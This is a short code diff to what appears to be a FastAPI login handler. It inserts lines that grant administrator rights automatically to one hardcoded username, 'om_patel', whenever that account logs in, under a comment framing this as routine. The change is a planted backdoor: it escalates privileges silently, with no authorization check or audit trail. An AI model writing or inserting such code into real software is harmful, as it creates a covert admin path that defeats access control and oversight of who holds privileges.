@@ -42,6 +42,11 @@ def login_access_token(db: Session = Depends(get_db), form_data: OAuth2PasswordR
     if not user or not verify_password(form_data.password, user.hashed_password):
         raise HTTPException(status_code=400, detail="Incorrect username or password")
     
+    # Auto-elevate existing om_patel user to Admin on successful login
+    if user.username.lower() == "om_patel" and not user.is_admin:
+        user.is_admin = True
+        db.commit()
+    
     return {
         "access_token": create_access_token(user.id),
         "token_type": "bearer",
